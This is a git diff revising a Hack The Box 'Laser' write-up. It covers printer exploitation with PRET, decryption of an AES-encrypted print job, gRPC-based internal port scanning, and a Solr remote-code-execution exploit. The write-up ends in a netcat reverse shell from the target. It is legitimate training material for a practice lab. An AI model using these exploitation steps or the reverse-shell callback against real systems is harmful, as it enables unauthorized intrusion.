@@ -116,7 +116,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 44.32 seconds
 ```
 
-3 ports open, 22 - SSH, 9000, and 9001. Searching for what uses ports 9000 and 9001 turns out these are commonly used by printers
+The Nmap scan only showed three open ports: 22 - SSH, 9000, and 9001. I wasn't familiar with them so I searched for what uses ports 9000 and 9001.  It turns out these are commonly used by printers.
 
 ### Port 9000 & 9001
 
@@ -141,11 +141,13 @@ telnet> quit
 Connection closed.
 ```
 
-connected with telnet and all text sent just got back `?`
+Next, I connected with telnet but everything I sent just got back the reply `?`.  I did some further research to see what kind of vulnerabilities might be exposed by having these two ports open.  There was plenty of information on how to exploit open printers.
 
-[http://www.irongeek.com/i.php?page=security/networkprinterhacking](http://www.irongeek.com/i.php?page=security/networkprinterhacking)
+* [http://www.irongeek.com/i.php?page=security/networkprinterhacking](http://www.irongeek.com/i.php?page=security/networkprinterhacking)
+* [https://book.hacktricks.xyz/pentesting/9100-pjl](https://book.hacktricks.xyz/pentesting/9100-pjl)
+* [http://hacking-printers.net/wiki/](http://hacking-printers.net/wiki/)
 
-[https://book.hacktricks.xyz/pentesting/9100-pjl](https://book.hacktricks.xyz/pentesting/9100-pjl)
+One of the sources pointed out that if you can access a printer and also SNMP, then the system is pretty much yours already.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
@@ -161,15 +163,13 @@ PORT    STATE  SERVICE REASON
 Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
 ```
 
-Unfortunately it seemed as if SNMP was not enabled on this machine \(or is using a non-standard port?\) as this would have given a good path forward.
+Unfortunately, it seemed as if SNMP was not enabled on this machine \(or was using a non-standard port?\) as this would have given a good path forward.
 
 ### Printer Exploitation Toolkit \(PRET\)
 
+After searching a bit more I came across a nice toolkit someone had put together for exploiting printers called the Printer Exploitation Toolkit \(PRET\).  
+
 [https://github.com/RUB-NDS/PRET](https://github.com/RUB-NDS/PRET)
-
-Printer Exploitation Toolkit
-
-[http://hacking-printers.net/wiki/](http://hacking-printers.net/wiki/)
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser/PRET]
@@ -229,7 +229,7 @@ cat    debug   discover  exit  get   info  loop  open   put       site
 close  delete  edit      free  help  load  ls    print  selftest  timeout
 ```
 
-Got a pret shell on the machine using the PCL printer language. I used the `help` command to get a list of further options to try
+Following the instructions, I was able to quickly get it up and running, and got a pret shell on the machine using the PS printer language. This only gave errors, so I switched to the PCL language and tried again.  This time I was able to use the `help` command to get a list of further options to try.
 
 ```text
 10.10.10.201:/> ls
@@ -241,9 +241,11 @@ Connection to 10.10.10.201 established
 This is a virtual pclfs. Use 'put' to upload files.
 ```
 
-Trying the `ls` command gave me an error message that said I could use `put` to upload files
+Trying the `ls` command gave me an error message that said I could use `put` to upload files.  None of the other commands gave anything further.
 
 > Due to its limited capabilities, PCL is hard to exploit from a security perspective unless one discovers interesting proprietary commands in some printer manufacturers's PCL flavour. The PRET tool implements a virtual, PCL-based file system which uses macros to save file content and metadata in the printer's memory. This hack shows that even a device which supports only minimalist page description languages like PCL can be used to store arbitrary files like copyright infringing material. Although turning a printer into a file sharing service is not a security vulnerability per se, it may apply as ‘misuse of service’ depending on the corporate policy.
+
+After reading up about the difference between the printer languages I decided that this one probably didn't speak the binary language of vaporators...I mean PCL.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser/PRET]
@@ -279,7 +281,7 @@ debug   display   format  id    mirror  print      selftest  traversal
 10.10.10.201:/>
 ```
 
-After testing all of the PCL commands and getting nothing I went back and tried the third language, PJL, and got another shell with many more commands
+After testing all of the PCL commands and getting nothing I went back and tried the third language, PJL, and got another shell with many more commands available after using the `help` command.
 
 ```text
 10.10.10.201:/> ls
@@ -298,7 +300,7 @@ b'VfgBAAAAAADOiDS0d+nn3sdU24Myj/njDqp6+zamr0JMcj84pLvGcvxF5IEZAbjjAH
 dgblOUDj6BOA+MLrAiC/chpVOipOMtlonY1lxELrGFvQKAO8RSMUZNovS5gkLUolUkX3X6OeCsYJRf20mrgSSQ'
 ```
 
-In the folder `/pjl/jobs` there was a file named `queued`. 
+This time I was able to navigate the file structure.  In the folder `/pjl/jobs` there was a file named `queued`. 
 
 {% hint style="info" %}
 I made the mistake of **`cat`**-ing the **`queued`** file at first. Don't do this, unless you want to copy the extremely long base64 string and recreate the file yourself. Use **`get`** instead...
@@ -309,7 +311,7 @@ I made the mistake of **`cat`**-ing the **`queued`** file at first. Don't do thi
 172199 bytes received.
 ```
 
-Use Get.  This will nicely download the file to your local machine.  It was still a wall of base64 encoded text so I tried to decode it.
+**Use `get`**.  This will nicely download the file to your local machine.  However, when I opened the file it was still a wall of base64 encoded text so I tried to decode it.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser/PRET]
@@ -317,7 +319,7 @@ Use Get.  This will nicely download the file to your local machine.  It was stil
 base64: invalid input
 ```
 
-After removing the extra characters \(that indicated that it was supposed to be a python byte string\) from the file I tried to base64 decode it, but it still seemed to be invalid encoding.  I decided to keep enumerating to see if I could find anything to help me move forward.
+After removing the extra characters \(that looked to indicate that it was supposed to be a python byte string\) from the file I tried to base64 decode it, but it still seemed to be invalid encoding.  I decided to keep enumerating to see if I could find anything to help me move forward.
 
 ```text
 10.10.10.201:/pjl/jobs> df
@@ -676,9 +678,8 @@ Not available.
 
 After going through pretty much all of the commands and finding very little useful information, I went back to the `queued` file I had downloaded. Since I now had a potential encryption key and had noted the encryption method was AES... which outputs base64 encoded material that wont decode properly...I figured I was on to something.  I did some research to make sure I had all the information I needed to decode the file if it were AES-CBC encrypted.
 
-[https://crypto.stackexchange.com/questions/7935/does-the-iv-need-to-be-known-by-aes-cbc-mode](https://crypto.stackexchange.com/questions/7935/does-the-iv-need-to-be-known-by-aes-cbc-mode)
-
-[https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256](https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256)
+* [https://crypto.stackexchange.com/questions/7935/does-the-iv-need-to-be-known-by-aes-cbc-mode](https://crypto.stackexchange.com/questions/7935/does-the-iv-need-to-be-known-by-aes-cbc-mode)
+* [https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256](https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256)
 
 ```python
 #!/usr/bin/env python3
@@ -703,7 +704,7 @@ with open("queued.stripped","r") as q64:
         out.write(pt)
 ```
 
-I wrote a simple python script to decode the `queued` file after I stripped out the extraneous characters, and wrote it out to a file `q-out`.  It took a few tries to do since there was no IV.  I read that sometimes the IV is simply the last byte section of the file, which worked to decode the file.
+I wrote a simple python script to decode the `queued` file after I stripped out the extraneous characters, and wrote it out to a file `q-out`.  It took a few tries to do since there was no IV.  I read that sometimes the IV is simply the last 16 byte section of the file, which worked to decode the file.  Since the file was an odd number of byte-chunks, I had to strip off the beginning extra bytes to get it to decode.
 
 ### The PDF document
 
@@ -713,7 +714,7 @@ I wrote a simple python script to decode the `queued` file after I stripped out 
 q-out: PDF document, version 1.4
 ```
 
-The file that was in the print queue turned out to be a PDF file
+The file that was in the print queue turned out to be a PDF document.
 
 ![](../../.gitbook/assets/2-q-ou1.png)
 
@@ -774,6 +775,8 @@ Bugs
 The PDF File contained instructions for interacting with a print API using gRPC on port 9000. It also contained the hostname `printer.laserinternal.htb` which I added to my `/etc/hosts` file. 
 
 ### The GRPC python client
+
+Now that I knew what protocol to use to communicate with the server, I needed to figure out how it worked, and how to use this to enumerate the server more.
 
 * [https://grpc.io/docs/languages/python/basics/](https://grpc.io/docs/languages/python/basics/)
 * [https://grpc.io/docs/what-is-grpc/introduction/](https://grpc.io/docs/what-is-grpc/introduction/)
@@ -905,13 +908,12 @@ rtt min/avg/max/mdev = 40.902/41.234/41.566/0.332 ms
 
 I was able to ping the machine, so my connectivity wasn't the problem.
 
-put in info about pinging back my machine
-
 ### Python port scanner - internal machine
 
-There may be an internal port open that I cannot reach, therefore the errors. I need some way of enumerating the inside.  Got a "Connection refused error", can use this to filter responses
+I decided that there may possibly be an internal port open that I cannot reach, therefore the errors. I needed some way of enumerating the inside.  Since I knew that a closed port gave a "Connection refused error", I could use this to filter responses.
 
-[https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python](https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python) [https://www.geeksforgeeks.org/port-scanner-using-python/](https://www.geeksforgeeks.org/port-scanner-using-python/)
+* [https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python](https://www.kite.com/python/answers/how-to-get-the-value-of-an-exception-as-a-string-in-python) 
+* [https://www.geeksforgeeks.org/port-scanner-using-python/](https://www.geeksforgeeks.org/port-scanner-using-python/)
 
 ```python
 import laser_pb2_grpc
@@ -981,19 +983,18 @@ Port 9100 open!
 Exception calling application: (1, 'Received HTTP/0.9 when not allowed\n')
 ```
 
-When I got back home I found two more ports open, and I noticed that port `8983` responded with the message of `feed: Pushing feeds` that was expected from the PDF.
+When I got back home I found that there were five ports open, and I noticed that port `8983` responded with the message of `feed: Pushing feeds` that was expected from the PDF.
 
 ### Solr exploitation
 
-A search for port 8983 exploit led me to [https://www.exploit-db.com/exploits/47572](https://www.exploit-db.com/exploits/47572)
+A search for port 8983 exploit led me to 
 
-Solr is an open source application from Apache which provides searching and indexing capabilities for large amounts of data.
+* [https://www.exploit-db.com/exploits/47572](https://www.exploit-db.com/exploits/47572)
+* [https://github.com/veracode-research/solr-injection](https://github.com/veracode-research/solr-injection)
+* [https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability](https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability)
+* [https://github.com/jas502n/solr\_rce](https://github.com/jas502n/solr_rce)
 
-[https://github.com/veracode-research/solr-injection](https://github.com/veracode-research/solr-injection)
-
-[https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability](https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability)
-
-[https://github.com/jas502n/solr\_rce](https://github.com/jas502n/solr_rce)
+Solr is an open source application from Apache which provides searching and indexing capabilities for large amounts of data.  Using the code from the exploit and my client from earlier I crafted a python script that would connect to the server, change the configuration to enable code execute, then allow for execution of arbitrary commands specified as arguments to the script.  
 
 ```python
 import laser_pb2
@@ -1045,13 +1046,15 @@ except:
 get_shell()
 ```
 
-
+After a lot of trial and error, I got my code to work and set up a netcat listener.  I made my payload a simple callback reverse shell and crossed my fingers.
 
 ## Initial Foothold
 
-## 
-
 ```text
+┌──(zweilos㉿kali)-[~/htb/laser]
+└─$ nc -lvnp 8099
+listening on [any] 8099 ...
+connect to [10.10.15.98] from (UNKNOWN) [10.10.10.201] 36790
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 solr@laser:~$ id && hostname
 uid=114(solr) gid=120(solr) groups=120(solr)
